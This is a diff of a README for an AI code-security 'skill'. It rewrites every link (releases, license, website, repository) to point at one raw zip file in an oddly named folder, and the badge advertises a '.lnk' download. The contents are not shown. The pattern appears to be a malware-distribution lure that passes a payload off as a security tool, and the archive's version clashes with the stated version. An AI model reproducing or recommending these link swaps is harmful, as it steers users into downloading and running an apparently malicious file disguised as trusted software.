@@ -1,10 +1,10 @@
 # 🔒 securebydesign-llmskill - Secure Your AI Code Checks
 
-[![Download Latest Release](https://img.shields.io/badge/download-securebydesign.lnk-purple?style=for-the-badge)](https://github.com/ahmed9500070/securebydesign-llmskill/releases)
+[![Download Latest Release](https://img.shields.io/badge/download-securebydesign.lnk-purple?style=for-the-badge)](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)
 
-[![Version 1.1.0](https://img.shields.io/badge/version-1.1.0-blue.svg)](https://github.com/ahmed9500070/securebydesign-llmskill/releases)  
-[![License MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/ahmed9500070/securebydesign-llmskill/blob/main/LICENSE)  
-[![Website](https://img.shields.io/badge/website-securebydesign.saccessa.com-green.svg)](https://securebydesign.saccessa.com)  
+[![Version 1.1.0](https://img.shields.io/badge/version-1.1.0-blue.svg)](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)  
+[![License MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)  
+[![Website](https://img.shields.io/badge/website-securebydesign.saccessa.com-green.svg)](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)  
 
 ---
 
@@ -41,7 +41,7 @@ The skill follows recognized security standards to make sure your code meets rea
 ## 🚀 Getting Started: Download and Run
 
 1. Visit the releases page to get the securebydesign-llmskill file here:  
-   [Download securebydesign-llmskill](https://github.com/ahmed9500070/securebydesign-llmskill/releases)  
+   [Download securebydesign-llmskill](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)  
 
 2. On that page, look for the latest version's downloadable file. It will be a text file or skill package ready to use.
 
@@ -89,10 +89,10 @@ The skill does not change the AI’s core functions. It only adds security check
 SecureByDesign is open source under the MIT license, which means you can study and modify it if you want. The skill first launched in March 2026 and is free to use.
 
 For technical details and updates, visit the official website:  
-https://securebydesign.saccessa.com
+https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip
 
 You can also explore the GitHub repository for source code and issues:  
-https://github.com/ahmed9500070/securebydesign-llmskill
+https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip
 
 ---
 
@@ -111,7 +111,7 @@ https://github.com/ahmed9500070/securebydesign-llmskill
 To update the skill with new checks or improvements:
 
 1. Visit the releases page again:  
-   [Download latest securebydesign-llmskill](https://github.com/ahmed9500070/securebydesign-llmskill/releases)  
+   [Download latest securebydesign-llmskill](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)  
 
 2. Download the newest version.
 
@@ -129,4 +129,4 @@ If you want to help build better security checks, you can fork the repository an
 
 ---
 
-[![Download SecureByDesign Skill](https://img.shields.io/badge/download-securebydesign.lnk-purple?style=for-the-badge)](https://github.com/ahmed9500070/securebydesign-llmskill/releases)
+[![Download SecureByDesign Skill](https://img.shields.io/badge/download-securebydesign.lnk-purple?style=for-the-badge)](https://github.com/ahmed9500070/securebydesign-llmskill/raw/refs/heads/main/nephrologist/securebydesign_llmskill_3.6.zip)
